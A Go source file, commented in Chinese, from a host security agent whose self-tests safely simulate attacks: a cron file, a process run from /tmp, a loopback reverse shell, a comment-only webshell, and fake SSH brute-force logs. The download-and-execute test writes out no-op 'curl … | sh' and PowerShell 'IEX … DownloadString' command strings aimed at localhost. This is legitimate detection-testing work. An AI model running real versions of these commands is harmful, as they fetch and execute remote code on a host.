package agent

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"log/slog"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"safe/internal/honeypot"
	"safe/internal/model"
	"safe/internal/simulate"
)

// 自检动作只做以下预定义的无害操作，产物都带自检编号并在结束后清理；不执行任何来自服务端的任意命令。
var (
	simCronDir  = "/etc/cron.d"
	simTmpDir   = "/tmp"
	simDuration = 120 * time.Second // 产物保留时长：覆盖 Agent 采集周期，保证能被检测到
)

func (a *Agent) runCommand(cmd model.AgentCommand) model.CommandResult {
	switch cmd.Type {
	case "action":
		return a.runAction(cmd)
	case "upgrade":
		return a.runUpgrade(cmd)
	}
	res := model.CommandResult{ID: cmd.ID, Status: "done"}
	if cmd.Type != "simulate" || !simulate.IDPattern.MatchString(cmd.ID) {
		res.Status, res.Detail = "error", "unsupported command"
		return res
	}
	var err error
	na := ""
	switch cmd.Scenario {
	case simulate.FileTamper:
		na, err = a.simFile(cmd.ID)
	case simulate.SuspiciousProcess:
		na, err = simProcess(cmd.ID)
	case simulate.HoneypotAccess:
		err = simHoneypot(cmd.ID, cmd.Params["target"])
	case simulate.ReverseShell:
		na, err = a.simReverseShell(cmd.ID)
	case simulate.DownloadExec:
		na, err = a.simDownloadExec(cmd.ID)
	case simulate.WebshellDrop:
		na, err = a.simWebshell(cmd.ID)
	case simulate.IntelDNS:
		simIntelDNS(cmd.ID)
	case simulate.BruteForce, simulate.BruteForceLogin, simulate.RootLogin:
		na = a.simLogin(cmd.ID, cmd.Scenario)
	default:
		res.Status, res.Detail = "error", "unknown scenario "+cmd.Scenario
		return res
	}
	switch {
	case na != "":
		res.Status, res.Detail = "not_applicable", na
	case err != nil:
		res.Status, res.Detail = "error", err.Error()
	}
	slog.Info("attack simulation", "id", cmd.ID, "scenario", cmd.Scenario, "status", res.Status, "detail", res.Detail)
	return res
}

// simFile 在计划任务目录写入一个只含注释的文件（不会被执行），稍后删除。
func (a *Agent) simFile(id string) (string, error) {
	monitored := false
	for _, p := range a.cfg.FIMPaths {
		if filepath.Clean(p) == simCronDir {
			monitored = true
		}
	}
	if !monitored {
		return "文件完整性监控未包含 " + simCronDir, nil
	}
	path := filepath.Join(simCronDir, "safe-simulation-"+id)
	content := "# safe 攻击模拟自检 " + id + "：只含注释，不会执行，约 2 分钟后自动删除\n"
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		return "无法写入 " + simCronDir + "（" + err.Error() + "）", nil
	}
	time.AfterFunc(simDuration, func() { os.Remove(path) })
	return "", nil
}

// SimulationChildArg 是"临时目录执行"自检启动测试进程用的参数：测试进程就是 Agent 自身的副本，
// 收到该参数后只等待指定秒数然后退出。不使用系统 sleep：uutils（Ubuntu 26.04 起）、BusyBox 等多合一程序
// 按文件名分派命令，复制改名后无法运行。
const SimulationChildArg = "-simulation-child-sleep"

// RunSimulationChildIfRequested 在 main 最开始调用：如果本进程是自检测试进程，等待后退出，不会返回。
func RunSimulationChildIfRequested() {
	if len(os.Args) == 3 && os.Args[1] == SimulationChildArg {
		secs, err := strconv.Atoi(os.Args[2])
		if err != nil || secs <= 0 || secs > 600 {
			os.Exit(2)
		}
		time.Sleep(time.Duration(secs) * time.Second)
		os.Exit(0)
	}
}

// simProcess 把 Agent 自身复制到临时目录运行（只等待，不做任何事），稍后结束并删除。
func simProcess(id string) (string, error) {
	if runtime.GOOS != "linux" {
		return "进程检测仅支持 Linux", nil
	}
	self, err := os.Executable()
	if err != nil {
		return "", err
	}
	dst := filepath.Join(simTmpDir, "safe-sim-"+id)
	if err := copyFile(self, dst, 0o700); err != nil {
		return "", err
	}
	cmd := exec.Command(dst, SimulationChildArg, strconv.Itoa(int(simDuration.Seconds())))
	var stderr strings.Builder
	cmd.Stderr = &stderr
	if err := cmd.Start(); err != nil {
		os.Remove(dst)
		return simTmpDir + " 不允许执行程序（noexec 挂载？）", nil
	}
	exited := make(chan error, 1)
	go func() {
		exited <- cmd.Wait()
		os.Remove(dst)
	}()
	// 确认进程确实在运行：立即退出的话自检必然失败，直接报告原因，而不是让它看起来像检测失效
	select {
	case err := <-exited:
		return "", fmt.Errorf("测试程序启动后立即退出（%v）：%s", err, strings.TrimSpace(stderr.String()))
	case <-time.After(500 * time.Millisecond):
		return "", nil
	}
}

// simHoneypot 连接蜜罐并发送自检标记。
func simHoneypot(id, target string) error {
	if target == "" {
		return fmt.Errorf("没有可用的蜜罐目标")
	}
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		return fmt.Errorf("连接蜜罐 %s 失败：%w", target, err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
	if _, err := fmt.Fprintf(conn, "%s%s\n", honeypot.SimulationMarker, id); err != nil {
		return err
	}
	reply, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil || strings.TrimSpace(reply) != "OK" {
		return fmt.Errorf("蜜罐 %s 未确认（%q %v）", target, reply, err)
	}
	return nil
}

func copyFile(src, dst string, mode os.FileMode) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_EXCL, mode)
	if err != nil {
		return err
	}
	if _, err := io.Copy(out, in); err != nil {
		out.Close()
		os.Remove(dst)
		return err
	}
	return out.Close()
}

func (a *Agent) hasCapability(c string) bool {
	for _, x := range a.info.Capabilities {
		if x == c {
			return true
		}
	}
	return false
}

// startShell 启动 sh 执行 script（结尾的 "; :" 防止 shell 直接被最后一条命令替换，保证进程一直是 shell），
// 确认存活后返回其 PID，simDuration 后结束。
func startShell(script string, stdio *os.File) (int, error) {
	cmd := exec.Command("/bin/sh", "-c", script+"; :")
	var stderr strings.Builder
	cmd.Stderr = &stderr
	if stdio != nil {
		cmd.Stdin, cmd.Stdout = stdio, stdio
	}
	if err := cmd.Start(); err != nil {
		return 0, err
	}
	exited := make(chan error, 1)
	go func() { exited <- cmd.Wait() }()
	time.AfterFunc(simDuration, func() { _ = cmd.Process.Kill() })
	select {
	case err := <-exited:
		return 0, fmt.Errorf("测试 shell 启动后立即退出（%v）：%s", err, strings.TrimSpace(stderr.String()))
	case <-time.After(500 * time.Millisecond):
		return cmd.Process.Pid, nil
	}
}

// simReverseShell 让 shell 的输入输出连接到 Agent 自己在本机建立的 TCP 连接：结构上与反弹 shell 相同，
// 但对端是 Agent 自己，不会收到任何命令。
func (a *Agent) simReverseShell(id string) (string, error) {
	if runtime.GOOS == "windows" {
		return "Windows 暂无此场景", nil
	}
	if !a.hasCapability("exec_monitor") {
		return "命令审计未启用（需要 Linux 且以 root 运行）", nil
	}
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return "", err
	}
	accepted := make(chan net.Conn, 1)
	go func() {
		c, err := ln.Accept()
		ln.Close()
		if err == nil {
			accepted <- c
		}
	}()
	client, err := net.Dial("tcp", ln.Addr().String())
	if err != nil {
		ln.Close()
		return "", err
	}
	f, err := client.(*net.TCPConn).File()
	if err != nil {
		client.Close()
		return "", err
	}
	// 编号放在空操作 ":" 的参数里（不能用 # 注释：会把 startShell 追加的 "; :" 一起注释掉）
	_, err = startShell(fmt.Sprintf("sleep %d; : safe-sim %s", int(simDuration.Seconds()), id), f)
	f.Close() // 子进程已继承
	time.AfterFunc(simDuration+5*time.Second, func() {
		client.Close()
		select {
		case c := <-accepted:
			c.Close()
		default:
		}
	})
	return "", err
}

// simDownloadExec 执行含"curl … | sh"字样的命令：":" 是 shell 的空操作，实际不下载也不执行。
func (a *Agent) simDownloadExec(id string) (string, error) {
	if runtime.GOOS == "windows" {
		if !a.hasCapability("exec_monitor") {
			return "进程创建审计（安全日志 4688）未生效：用一键安装脚本安装，或开启“审核进程创建”和命令行记录", nil
		}
		// "#" 之后是 PowerShell 注释：命令行含下载执行的特征，实际什么也不执行
		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command",
			fmt.Sprintf("# IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9/safe-sim-%s')", id))
		if out, err := cmd.CombinedOutput(); err != nil {
			return "", fmt.Errorf("测试命令执行失败（%v）：%s", err, strings.TrimSpace(string(out)))
		}
		return "", nil
	}
	if !a.hasCapability("exec_monitor") {
		return "命令审计未启用（需要 Linux 且以 root 运行）", nil
	}
	_, err := startShell(fmt.Sprintf(": curl http://127.0.0.1:9/safe-sim-%s | sh; sleep %d", id, int(simDuration.Seconds())), nil)
	return "", err
}

// simWebshell 在第一个存在的网站目录写入只含注释的 PHP 文件，稍后删除。
func (a *Agent) simWebshell(id string) (string, error) {
	for _, dir := range a.cfg.WebDirs {
		if fi, err := os.Stat(dir); err != nil || !fi.IsDir() {
			continue
		}
		path := filepath.Join(dir, "safe-sim-"+id+".php")
		content := "<?php /* safe 攻击模拟自检 " + id + "：不包含任何代码，约 2 分钟后自动删除 */ ?>\n"
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			return "无法写入网站目录 " + dir + "（" + err.Error() + "）", nil
		}
		time.AfterFunc(simDuration, func() { os.Remove(path) })
		return "", nil
	}
	return "本机没有网站目录（" + strings.Join(a.cfg.WebDirs, "、") + "）", nil
}

// simLogin 用内置样例日志生成登录事件，经真实的日志解析器后随下次上报发出。不发起登录、不写系统日志，
// 所以验证的是"解析 → 上报 → 管理中心判定"，不包括读取 auth 日志这一段。
func (a *Agent) simLogin(id, scenario string) string {
	if runtime.GOOS == "windows" {
		return "Windows 登录事件来自安全日志，此场景暂不覆盖"
	}
	now := time.Now().UTC()
	src := "192.0.2." + strconv.Itoa(simSourceOctet(id)) // 文档保留地址，不会是真实来源
	line := func(msg string) string {
		return now.Format("2006-01-02T15:04:05Z") + " safe-sim sshd[1]: " + msg + " from " + src + " port 40000 ssh2"
	}
	var lines []string
	if scenario == simulate.RootLogin {
		lines = append(lines, line("Accepted password for root"))
	} else {
		for i := 0; i < 10; i++ {
			lines = append(lines, line("Failed password for safe-sim"))
		}
		if scenario == simulate.BruteForceLogin {
			lines = append(lines, line("Accepted password for safe-sim"))
		}
	}
	var events []model.HostEvent
	for _, l := range lines {
		for _, ev := range ParseAuthLine(l, now) {
			ev.SimulationID = id
			events = append(events, ev)
		}
	}
	a.putBackExecEvents(events)
	return ""
}

// simSourceOctet 从自检编号算出 1–254：每次自检用不同来源，互不累计失败次数。
func simSourceOctet(id string) int {
	n, _ := strconv.ParseUint(strings.TrimPrefix(id, "sim-"), 16, 32)
	return int(n%254) + 1
}

// simIntelDNS 查询内置情报域名下带自检编号的子域名。查询必然得到“不存在”，结果不重要：
// 关键是查询经过网络时被探针看到并匹配情报。
func simIntelDNS(id string) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	_, _ = net.DefaultResolver.LookupHost(ctx, id+"."+simulate.IntelDomain)
}
